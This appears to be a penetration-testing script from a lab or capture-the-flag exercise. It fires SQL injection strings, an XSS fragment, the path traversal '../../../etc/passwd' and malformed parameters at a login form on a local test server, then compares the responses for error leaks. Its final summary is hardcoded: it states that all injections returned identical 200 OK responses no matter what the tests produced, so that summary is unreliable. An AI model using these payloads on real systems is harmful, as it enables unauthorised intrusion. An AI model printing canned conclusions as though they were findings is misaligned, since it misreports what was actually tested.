import requests
import re

# Target configuration
target_url = "http://127.0.0.1:32989/index.php"
base_url = "http://127.0.0.1:32989"

print("ALTERNATIVE VULNERABILITY TESTING")
print("=" * 80)

# 1. Test GET parameters
print("\n[1] TESTING GET PARAMETERS")
print("-" * 40)

get_params_tests = [
    f"{target_url}?id=1",
    f"{target_url}?id=1'",
    f"{target_url}?user=admin",
    f"{target_url}?user=admin'",
    f"{target_url}?page=home",
    f"{target_url}?page=home'",
]

for url in get_params_tests:
    try:
        resp = requests.get(url, timeout=10)
        print(f"GET {url[-20:]}: Status={resp.status_code}, Length={len(resp.content)}")
    except Exception as e:
        print(f"GET {url[-20:]}: Error - {e}")

# 2. Test different content types
print("\n\n[2] DIFFERENT CONTENT TYPES")
print("-" * 40)

# JSON injection
try:
    headers = {'Content-Type': 'application/json'}
    json_data = {"username": "admin' OR '1'='1", "password": "x"}
    resp = requests.post(target_url, json=json_data, headers=headers, timeout=10)
    print(f"JSON payload: Status={resp.status_code}, Length={len(resp.content)}")
except Exception as e:
    print(f"JSON payload: Error - {e}")

# XML injection
try:
    headers = {'Content-Type': 'application/xml'}
    xml_data = "<?xml version=\"1.0\"?><user><name>admin' OR '1'='1</name></user>"
    resp = requests.post(target_url, data=xml_data, headers=headers, timeout=10)
    print(f"XML payload: Status={resp.status_code}, Length={len(resp.content)}")
except Exception as e:
    print(f"XML payload: Error - {e}")

# 3. Check response for any dynamic content
print("\n\n[3] RESPONSE ANALYSIS")
print("-" * 40)

resp = requests.post(target_url, data={"username": "test", "password": "test"}, timeout=10)
print(f"Response length: {len(resp.text)} bytes")

# Look for forms, hidden fields, interesting content
forms = re.findall(r'<form[^>]*>.*?</form>', resp.text, re.DOTALL | re.IGNORECASE)
print(f"\nForms found: {len(forms)}")

inputs = re.findall(r'<input[^>]*>', resp.text, re.IGNORECASE)
print(f"Input fields: {len(inputs)}")
for inp in inputs:
    print(f"  - {inp}")

# 4. Check for PHP session/login indicators
print("\n\n[4] SESSION/COOKIE ANALYSIS")
print("-" * 40)

# Make multiple requests to see if session handling varies
for i, creds in enumerate([("admin", "admin"), ("test", "test"), ("admin", "wrong")]):
    resp = requests.post(target_url, data={"username": creds[0], "password": creds[1]}, timeout=10)
    print(f"Request {i+1} ({creds[0]}/{creds[1]}):")
    print(f"  Cookies: {dict(resp.cookies)}")
    print(f"  Set-Cookie header: {resp.headers.get('Set-Cookie', 'None')}")

# 5. Error-based attempts - look for information disclosure
print("\n\n[5] ERROR-BASED INFORMATION DISCLOSURE")
print("-" * 40)

error_tests = [
    ("Array to string", "admin[]", "x"),
    ("Object injection", "admin[a]", "x"),
    ("Long string (10KB)", "A" * 10000, "x"),
    ("Special chars", "admin'\"><script>", "x"),
    ("SQL keywords", "UNION SELECT * FROM users", "x"),
    ("Path traversal in username", "../../../etc/passwd", "x"),
]

for desc, user, pwd in error_tests:
    try:
        resp = requests.post(target_url, data={"username": user, "password": pwd}, timeout=10)
        error_indicators = ["error", "warning", "mysql", "sql", "syntax"]
        found = any(indicator in resp.text.lower() for indicator in error_indicators)
        print(f"{desc}: Status={resp.status_code}, Length={len(resp.content)}, Error keywords={found}")
    except Exception as e:
        print(f"{desc}: Exception - {str(e)[:50]}")

# 6. Full response comparison
print("\n\n[6] DETAILED RESPONSE COMPARISON")
print("-" * 40)

# Get responses for different inputs
test_cases = [
    ("admin", "admin"),
    ("' OR '1'='1", "x"),
    ("admin' --", "x"),
    ("random_user", "random_pass"),
]

responses = []
for user, pwd in test_cases:
    resp = requests.post(target_url, data={"username": user, "password": pwd}, timeout=10)
    responses.append((user, pwd, resp.text))

# Compare character by character for first 500 chars
print("\nComparing responses (showing first 300 chars where they differ):")
if responses:
    base_resp = responses[0][2]
    for user, pwd, resp_text in responses[1:]:
        if resp_text != base_resp:
            print(f"\n[!] DIFFERENCE FOUND for username={repr(user)}")
            # Find first difference
            for i, (c1, c2) in enumerate(zip(base_resp[:300], resp_text[:300])):
                if c1 != c2:
                    print(f"    First diff at position {i}: '{c1}' vs '{c2}'")
                    break
        else:
            print(f"No difference for username={repr(user)}")

print("\n\n[7] FINAL SUMMARY")
print("=" * 80)
print("All tested injection techniques returned identical 200 OK responses.")
print("This suggests either:")
print("  1. The application uses prepared statements (secure)")
print("  2. The SQL injection vector is in a different location")
print("  3. A different type of vulnerability exists")
print("  4. The vulnerable endpoint is not /index.php")

